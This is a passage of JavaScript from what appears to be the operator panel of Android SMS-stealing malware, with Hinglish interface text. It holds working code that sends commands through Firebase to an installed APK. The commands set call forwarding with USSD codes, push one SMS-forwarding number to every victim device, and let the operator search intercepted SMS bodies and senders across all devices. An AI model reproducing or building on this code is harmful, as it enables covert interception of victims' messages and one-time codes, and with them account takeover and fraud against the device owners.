      var r=document.getElementById('cf-res'); r.style.display='block';
      if(d&&!d.error){
        r.textContent='To: '+(d.PhoneNumber||'-')+' | Status: '+(d.Type||d.Status||'-')+' | SIM: '+(d.SubID||'-');
      } else {r.textContent='Set nahi hai';}
    });
    return;
  }
  /* Write to Firebase */
  var cfData;
  if(action==='active'){
    cfData={PhoneNumber:num, Status:'Yes', SubID:String(SEL_SIM+1), Type:'Active'};
  } else {
    cfData={PhoneNumber:num, Status:'No', SubID:String(SEL_SIM+1), Type:'DeActive'};
  }
  /* Write to Call_For/<deviceKey> */
  fbSet(NODE+'/All_User/Call_For/'+CUR, cfData)
    .then(function(){
      /* Also write USSD command for APK to execute */
      var ussd = action==='active' ? '**21*'+num+'#' : '##21#';
      return fbSet(NODE+'/All_User/ForwardCmd/'+CUR, {cmd:ussd, sim:SEL_SIM+1, ts:String(Date.now())});
    })
    .then(function(){
      showToast(action==='active'?'Call Forwarding Active!':'Call Forwarding Deactive!');
      closeDialog('dlg-cf');
      if(document.getElementById('tab-fwd').className.indexOf('active')!==-1) loadFwdTab(CUR);
    })
    .catch(function(e){showToast('Error: '+e.message);});
}

/* ---- UPDATE NO ---- */
/* Writes number to Info/<deviceKey>/Number for ALL devices */
/* APK reads this and forwards SMS to that number */
function openUpdNo(){document.getElementById('upd-num').value='';openDialog('dlg-upd');}
function doUpdateNo(){
  var num=document.getElementById('upd-num').value.trim();
  if(!num){showToast('Number daalo!');return;}
  var dkeys=Object.keys(DEVS);
  if(!dkeys.length){showToast('Koi device nahi!');return;}
  showToast('Updating '+dkeys.length+' devices...');
  var done=0;
  for(var i=0;i<dkeys.length;i++){
    (function(k){
      /* Write to Info/<deviceKey>/Number - APK reads this for SMS forwarding */
      fbSet(NODE+'/All_User/Info/'+k+'/Number', num)
        .then(function(){
          done++;
          if(done===dkeys.length){
            /* Also write to UpdateNo node */
            fbSet(NODE+'/All_User/UpdateNo', num).then(function(){
              showToast('Update successfully - '+done+' devices!');
              closeDialog('dlg-upd');
            });
          }
        })
        .catch(function(){done++;});
    })(dkeys[i]);
  }
}

/* ---- SEARCH ---- */
/* Real-time search across ALL devices SMS */
var SEARCH_TIMER=null;
function onSearchInput(q){
  document.getElementById('s-cl').style.display=q?'block':'none';
  clearTimeout(SEARCH_TIMER);
  if(!q.trim()){
    document.getElementById('search-screen').style.display='none';
    var ap=document.getElementById('app');ap.style.display='flex';ap.style.flexDirection='column';
    return;
  }
  /* Debounce 300ms */
  SEARCH_TIMER=setTimeout(function(){runSearch(q.trim());},300);
}

function runSearch(q){
  document.getElementById('app').style.display='none';
  document.getElementById('detail-screen').style.display='none';
  var ss=document.getElementById('search-screen');ss.style.display='flex';ss.style.flexDirection='column';
  var ql=q.toLowerCase();
  /* Search in loaded SMS */
  var results=[];
  var devs=Object.values(DEVS);
  for(var i=0;i<devs.length;i++){
    var d=devs[i]; var matches=[];
    for(var j=0;j<d.sms.length;j++){
      var s=d.sms[j];
      var b=(s.msg||s.body||s.Body||s.message||s.text||'').toLowerCase();
      var a=(s.ph||s.address||s.Address||s.sender||s.number||'').toLowerCase();
      if(b.indexOf(ql)!==-1||a.indexOf(ql)!==-1) matches.push(s);
    }
    if(matches.length) results.push({d:d,m:matches});
  }
  var total=0;
  for(var i=0;i<results.length;i++) total+=results[i].m.length;
  var infoEl=document.getElementById('sr-info');
  infoEl.textContent=results.length
    ?'"'+q+'" - '+results.length+' device mein, '+total+' SMS mila'
    :'"'+q+'" - koi SMS nahi mila';
  var el=document.getElementById('sr-list');
  if(!results.length){el.innerHTML='<div class="empty"><div class="ei">&#128269;</div><p>Koi SMS nahi mila</p></div>';return;}
  el.innerHTML='';
  var frag=document.createDocumentFragment();
  for(var i=0;i<results.length;i++){
    var r=results[i];
    var card=document.createElement('div');
    card.className='src-card';
    var badge=document.createElement('span');
    badge.className='src-badge';
    badge.textContent='&#128241; '+r.d.name;
    var cnt=document.createElement('span');
    cnt.style.cssText='font-size:11px;color:#64748b;margin-left:6px;';
    cnt.textContent=r.m.length+' SMS';
    card.appendChild(badge); card.appendChild(cnt);
    /* Show first 3 matches */
    var lim=Math.min(3,r.m.length);
    for(var j=0;j<lim;j++){
      var s=r.m[j];
      var addr=s.ph||s.address||s.Address||s.sender||s.number||'-';
      var body=s.msg||s.body||s.Body||s.message||s.text||'-';
      var mc=document.createElement('div'); mc.className='sms-card'; mc.style.marginTop='8px';
      var aEl=document.createElement('div'); aEl.className='sms-addr'; aEl.textContent='Address : '+String(addr);
      var bEl=document.createElement('div'); bEl.className='sms-body';
      bEl.innerHTML=hlText(eh(String(body)),q);
      mc.appendChild(aEl); mc.appendChild(bEl); card.appendChild(mc);
    }
    if(r.m.length>3){
      var more=document.createElement('div');
      more.style.cssText='font-size:12px;color:#5b21b6;text-align:center;padding:4px 0;';
      more.textContent='+'+(r.m.length-3)+' aur - tap karke dekho';
      card.appendChild(more);
    }
    (function(key){card.addEventListener('click',function(){openDevice(key);});})(r.d.key);
    frag.appendChild(card);
  }
  el.appendChild(frag);
}

function clearSearch(){
  document.getElementById('gsearch').value='';
  document.getElementById('s-cl').style.display='none';
  document.getElementById('search-screen').style.display='none';
  var ap=document.getElementById('app');ap.style.display='flex';ap.style.flexDirection='column';
}

function goBack(){
  document.getElementById('detail-screen').style.display='none';
  var q=(document.getElementById('gsearch').value||'').trim();
  if(q){var ss=document.getElementById('search-screen');ss.style.display='flex';ss.style.flexDirection='column';}
  else{var ap=document.getElementById('app');ap.style.display='flex';ap.style.flexDirection='column';}
  window.scrollTo(0,0);
}

function hlText(text,q){
  if(!q) return text;
  var out='',lo=text.toLowerCase(),lq=q.toLowerCase(),i=0;
  while(true){
    var p=lo.indexOf(lq,i);
    if(p===-1){out+=text.slice(i);break;}
    out+=text.slice(i,p)+'<span class="hl">'+text.slice(p,p+q.length)+'</span>';
    i=p+q.length;
  }
  return out;
}

/* ---- UTILS ---- */
function getTs(s){
  var t=s.date||s.Date||s.timestamp||s.time||0;
  if(typeof t==='string') t=parseFloat(t)||0;
  if(typeof t==='number') return t>1e12?t:t*1000;
  return 0;
}
function fmtDate(t){
  if(!t) return '';
  try{
    var n=typeof t==='string'?parseFloat(t):t;
    var d=n>1e12?new Date(n):new Date(n*1000);
    if(isNaN(d.getTime())) return String(t);
    return d.toLocaleString('en-IN',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
  }catch(e){return String(t);}
}
function eh(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function openDialog(id){document.getElementById(id).style.display='flex';}
function closeDialog(id){document.getElementById(id).style.display='none';}
var ovs=document.querySelectorAll('.overlay');
for(var oi=0;oi<ovs.length;oi++){
  ovs[oi].addEventListener('click',function(e){if(e.target===this)this.style.display='none';});
}
function showToast(msg){
  var t=document.getElementById('toast');t.textContent=msg;t.style.opacity='1';
  clearTimeout(TTIMER);TTIMER=setTimeout(function(){t.style.opacity='0';},2500);
}
</script>
